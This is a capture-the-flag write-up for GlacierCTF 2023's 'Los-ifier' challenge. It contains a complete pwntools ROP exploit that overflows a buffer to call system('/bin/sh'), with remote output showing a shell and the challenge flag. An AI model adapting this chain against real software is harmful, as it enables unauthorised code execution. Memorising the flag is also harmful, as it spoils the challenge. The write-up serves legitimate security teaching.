# Los-ifier [90 Solves]

## Description

> Normal binary for normal people.
>
> authors: PaideiaDilemma & huksys
>
> `nc chall.glacierctf.com 13392`
>
> Attachments: Losifier.tar.gz

```console
$ tar ztf Losifier.tar.gz
Losifier/
Losifier/Dockerfile
Losifier/chall
```

## Flag

gctf{l0ssp34k_UwU_L0v3U}

## Solution

```console
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=d0603ba281b2372084e4f2a9250bd5b79e916b91, for GNU/Linux 4.4.0, not stripped

$ checksec chall
[*] '/root/ctf/GlacierCTF_2023/intro/Losifier/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ROP

Looking at how to work in chall binary, RIP is controllable by setting offset 85 (0x55).

`system()` function:

```console
$ readelf -s chall | grep system
   156: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS system.o
   157: 0000000000404660   879 FUNC    LOCAL  DEFAULT    7 do_system
   591: 000000000047cdd8    10 OBJECT  LOCAL  DEFAULT    9 system_dirs
  1066: 0000000000404ae0    45 FUNC    WEAK   DEFAULT    7 system
  1668: 0000000000404ae0    45 FUNC    GLOBAL DEFAULT    7 __libc_system
```

`/bin/sh`:

```console
$ strings -a -t x chall | grep /bin/sh
  7800e @@/bin/sh
  784d9 /bin/sh
```

- [x64_64 register mapping for library call](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#library_call)

  > | 1st parameter | 2nd parameter | 3rd parameter | 4th parameter | 5th parameter | 6th parameter |
  > |---------------|---------------|---------------|---------------|---------------|---------------|
  > | rdi           | rsi           | rdx           | rcx           | r8            | r9            |

Set `/bin/sh` to the rdi, call the `system()` function, and a shell pop up.

ROP Gadget:

```console
$ ROPgadget --binary ./chall | grep -E '(: ret$|pop rdi ; ret$)'
0x0000000000402188 : pop rdi ; ret
0x000000000040101a : ret
```

solver.py

```python
from pwn import *

context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./chall", checksec=False)

ret = 0x40101A
system = 0x404AE0
pop_rdi = 0x402188
binsh = 0x4784D9


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("chall.glacierctf.com", 13392)

    elif args.GDB:
        gdbscript = """
        # b *main+73
        # b printf_handler
        # b *printf_handler+134
        b *printf_handler+175
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    payload = b""
    payload += b"A" * 85

    # payload += p64(0xDEADBEEF)
    payload += p64(ret)

    payload += p64(pop_rdi)
    payload += p64(binsh)

    payload += p64(system)

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

result:

```console
$ python3 solver.py REMOTE
[+] Opening connection to chall.glacierctf.com on port 13392: Done
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ ls -la
total 764
drwxr-xr-x 1 root root   4096 Nov 23 22:49 .
drwxr-xr-x 1 root root   4096 Nov 25 17:52 ..
-rwxr-xr-x 1 root root 769056 Nov 23 22:19 app
-rw-r--r-- 1 root root     25 Nov 23 22:19 flag.txt
$ cat flag.txt
gctf{l0ssp34k_UwU_L0v3U}
$
[*] Closed connection to chall.glacierctf.com port 13392
```
